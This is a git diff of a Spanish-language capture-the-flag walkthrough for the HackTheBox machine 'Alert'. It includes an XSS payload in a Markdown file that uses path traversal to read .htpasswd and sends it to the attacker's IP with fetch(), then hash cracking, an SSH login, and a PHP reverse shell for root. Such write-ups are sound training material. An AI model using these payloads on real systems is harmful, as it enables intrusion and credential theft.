@@ -1,6 +1,6 @@
 ---
-hidden: true
 icon: desktop
+hidden: true
 layout:
   title:
     visible: true
@@ -49,9 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
            Raw packets sent: 69477 (3.057MB) | Rcvd: 69475 (2.779MB)
 ```
 
-
-
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -64,9 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página de `Apache`y servicio`SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.44 -A -oN targeted -oX targetedXML
@@ -101,7 +97,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -110,44 +106,26 @@ Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis
 
-
-
-
-<figure><img src="../../../../.gitbook/assets/3980_vmware_6nyUPLyZTV.png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`, debido a que en el resultado de `Nmap`, nos aparecía que el sitio web nos redirigía a [http://alert.htb](http://alert.htb)
 
 ```bash
 ❯ catnp /etc/hosts | grep 10.10.11.44
 10.10.11.44 alert.htb
 ```
 
+## Web Enumeration
 
+Accedemos al sitio web [http://alert.htb](http://alert.htb) en el cual parece ser un visualizado de archivos `.MD` (Markdown). Vemos que nos permite subir archivos en el sitio web.
 
+<figure><img src="../../../../.gitbook/assets/imagen (229).png" alt=""><figcaption></figcaption></figure>
 
+Por otro lado, también comprobamos que disponemos de una página para contactar con los administradores del sitio web.
 
-<figure><img src="../../../../.gitbook/assets/3982_vmware_zDpfZXGjIp.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/imagen (230).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-<figure><img src="../../../../.gitbook/assets/imagen (212).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-<figure><img src="../../../../.gitbook/assets/imagen (213).png" alt=""><figcaption></figcaption></figure>
-
-
-
-<figure><img src="../../../../.gitbook/assets/imagen (214).png" alt=""><figcaption></figcaption></figure>
-
-
+Crearemos el siguiente archivo `example.md` para subirlo al sitio web y visualizar el comportamiento de este.
 
 ```markdown
 ❯ catnp example.md
@@ -167,21 +145,15 @@ Alt-H2
 ------
 ```
 
+Subiremos este archivo `example.md` en el sitio web y le daremos a la opción de **View Markdown**.
 
+<figure><img src="../../../../.gitbook/assets/imagen (231).png" alt=""><figcaption></figcaption></figure>
 
+Comprobaremos que ha interpretado el archivo de Markdown correctamente
 
+<figure><img src="../../../../.gitbook/assets/imagen (232).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/3986_vmware_V1VHd2Xe5a.png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-<figure><img src="../../../../.gitbook/assets/imagen (215).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Realizaremos **fuzzing** en el sitio web y logramos encontrar un nuevo subdominio llamado `statistics`.
 
 ```bash
 ❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://alert.htb -H "Host:FUZZ.alert.htb" -ac -t 200
@@ -210,22 +182,18 @@ ________________________________________________
 statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 94ms]// Some code
 ```
 
-
-
-
+Añadiremos esta nueva entrada en el archivo `/etc/passwd`.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.44
 10.10.11.44 alert.htb statistics.alert.htb
 ```
 
+Probaremos de acceder a [http://statistics.alert.htb ](http://statistics.alert.htb)y vemos que nos requiere de credenciales de acceso que no disponemos.
 
+<figure><img src="../../../../.gitbook/assets/imagen (233).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/imagen (216).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Realizaremos una enumeración de directorios y archivos PHP en el sitio web, y nos encontramos con la siguientes páginas.
 
 ```bash
 ❯ gobuster dir -u http://alert.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x php
@@ -252,29 +220,45 @@ Starting gobuster in directory enumeration mode
 /contact.php          (Status: 200) [Size: 24]
 ```
 
+## Initial Access
 
+### Performing XSS injection to obtain .htpasswd with MarkDown file
 
+En el siguiente artículo nos habla de los archivos `.htpasswd`. En la enumeración inicial, descubrimos que el sitio web se encontraba en un `Apache`. En el sitio web de `statistics.alert.htb` nos requería de credenciales de acceso.
 
+Lo cual nos hace pensar que si lograramos llegar a visualizar el archivo `.htpasswd`, lograríamos obtener las contraseñas en formato hash.
+
+{% hint style="info" %}
+.htpasswd es un archivo plano o de texto que contiene texto ASCII. Las estructuras de archivo .htpaswd son muy simples, donde cada línea almacena un nombre de usuario y contraseñas relacionadas. El nombre de usuario y la contraseña están delimitados por un signo de dos puntos.
+{% endhint %}
 
 {% embed url="https://blog.csdn.net/cunjiu9486/article/details/109071899" %}
 
+Crearemos un archivo `payload.md` que contenga el siguiente contenido JavaScript. El objetivo de este script, es realizar un Local File Inclusion para visualizar el contenido `.htpasswd` de la página web `statistics.alert.htb` y otorgarnos el resultado en nuestro servidor web que montaremos posteriormente.
 
+El archivo lo subiremos en el visualizador Markdown del sitio web.
 
-<figure><img src="../../../../.gitbook/assets/3990_vmware_Vg278t6mQE.png" alt=""><figcaption></figcaption></figure>
+```javascript
+<script>
+fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.16.5/?file_content=" + encodeURIComponent(data));
+  });
+</script>
+```
 
+<figure><img src="../../../../.gitbook/assets/imagen (234).png" alt=""><figcaption></figcaption></figure>
 
+Al subir el archivo, nos da la opción de `Share Markdown` el cual nos porporciona un enlace.
 
-<figure><img src="../../../../.gitbook/assets/imagen (221).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/imagen (221).png" alt="" width="563"><figcaption></figcaption></figure>
 
+Probaremos de acceder al apartado de `Contact Us` para validar si enviando este enlace a los administradores del sitio web, algún usuario llegase a ejecutarlo.
 
+<figure><img src="../../../../.gitbook/assets/imagen (220).png" alt="" width="563"><figcaption></figcaption></figure>
 
-
-
-<figure><img src="../../../../.gitbook/assets/imagen (220).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Desde nuestro servidor Web, verificaremos que hemos recibido el contenido del archivo `.htpasswd`.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -282,17 +266,13 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.44 - - [21/Jan/2025 22:41:26] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
 ```
 
-
-
-
+Descodificaremos el contenido obtenido a través de `Cyberchef` y logramos tener el archivo en texto plano. Comprobamos que nos aparece el usuario `albert` y su contraseña en formato hash.
 
 <figure><img src="../../../../.gitbook/assets/imagen (219).png" alt=""><figcaption></figcaption></figure>
 
+### Cracking Hashes
 
-
-
-
-
+Comprobaremos el tipo de hash del cual se trata, nos muestra que es un hash de `Apache MD5`. Miraremos en `hashcat` cual es el modo del tipo de hash y al ejecutar la herramienta logramos crackear el hash y obtener la contraseña en texto plano.
 
 ```bash
 ❯ hashid '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/'
@@ -311,9 +291,9 @@ hashcat (v6.2.6) starting
 $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited 
 ```
 
+### SSH connection with the new password cracked
 
-
-
+Nos conectaremos mediante el servicio `SSH` con el usuario `albert` y verificamos que logramos acceder y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh albert@10.10.11.44
@@ -327,14 +307,14 @@ albert@10.10.11.44's password:
 ...[snip]...
 
 albert@alert:~$ cat user.txt 
-977a065a695ed4e13c56fcd257055753
+977a065a6***********************
 ```
 
+## Privilege Escalation
 
+### Reviewing of the processes running on the machine
 
-
-
-
+Revisando los puertos internos que se encuentran en el equipo, verificamos que el puerto 8080 se encuentra abierto, lo cual parece ser que haya un servicio HTTP en dicho puerto.
 
 ```bash
 albert@alert:~$ netstat -ano | grep LISTEN
@@ -345,7 +325,7 @@ tcp6       0      0 :::80                   :::*                    LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
 ```
 
-
+Revisando los procesos que se encuentran en ejecución, visualizamos que el usuario `root` tiene en ejecución este proceso que se ejecuta en la ruta `/opt/website-monitor`.
 
 ```bash
 albert@alert:~$ ps aux
@@ -353,7 +333,7 @@ albert@alert:~$ ps aux
 root        1003  0.0  0.6 207012 26488 ?        Ss   15:36   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
 ```
 
-
+Realizaremos **SSH Port Forwarding** sobre el puerto 8080 hacía nuestro equipo local.
 
 ```bash
 ❯ ssh -L 127.0.0.1:8080:127.0.0.1:8080 albert@10.10.11.44
@@ -364,11 +344,13 @@ Last login: Tue Jan 21 17:24:20 2025 from 10.10.16.5
 albert@alert:~$
 ```
 
+Accederemos desde nuestro navegador al puerto 8080 y comprobamos que se trata de la siguiente página web que no nos proporciona ningún tipo de información relevante.
 
+<figure><img src="../../../../.gitbook/assets/3999_vmware_QGrKK93Q1Z.png" alt="" width="563"><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/3999_vmware_QGrKK93Q1Z.png" alt=""><figcaption></figcaption></figure>
+### **Abusing Group Permissions to Create a PHP File on a Website and Gain Access as Root User**
 
-
+Accediendo a la ruta que encontramos que el usuario `root` tenía en ejecución esta página web, nos encontramos en el directorio `config` disponemos de permisos para leer y ejecutar archivos en esta ruta, dado que el usuario actual, dispone del grupo `management`.
 
 ```bash
 albert@alert:/opt/website-monitor/config$ id
@@ -378,7 +360,7 @@ total 4
 -rwxrwxr-x 1 root management 49 Nov  5 14:31 configuration.php
 ```
 
-
+Crearemos en este directorio que disponemos de acceso, un archivo PHP que nos establezca una Reverse Shell hacía nuestro equipo. Verificaremos que hemos logrado crear el archivo `gzzcoo.php` en la ruta `/opt/website-monitor/config`.
 
 ```bash
 albert@alert:/opt/website-monitor/config$ cat gzzcoo.php 
@@ -389,20 +371,22 @@ total 8
 -rwxrwxr-x 1 albert management 75 Jan 21 17:32 gzzcoo.php
 ```
 
-
+Desde nuestra terminal de atacante, nos pondremos en escucha por el puerto especificado en el payload creado.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Realizaremos una petición por GET a través de la herramienta `cURL` sobre 127.0.0.1:8080/config/gzzcoo.php
 
 ```bash
 ❯ curl -s -X GET '127.0.0.1:8080/config/gzzcoo.php'
 ```
 
+Dado que el servicio se ejecuta con los permisos del usuario `root`, al haber subido ese archivo PHP en la ruta donde teníamos acceso de escritura, su ejecución sería realizada por el mismo usuario `root`. Esto nos permitió que el usuario `root` ejecutara el payload de la Reverse Shell que subimos, dándonos así control total del sistema.
 
+Comprobamos que podemos visualizar la flag de **root.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -411,5 +395,5 @@ connect to [10.10.16.5] from (UNKNOWN) [10.10.11.44] 50392
 bash: cannot set terminal process group (1003): Inappropriate ioctl for device
 bash: no job control in this shell
 root@alert:/opt/website-monitor/config$ cat /root/root.txt
-2352161ead25a3ffc27a2b17d3daa11b
+2352161ea***********************
 ```
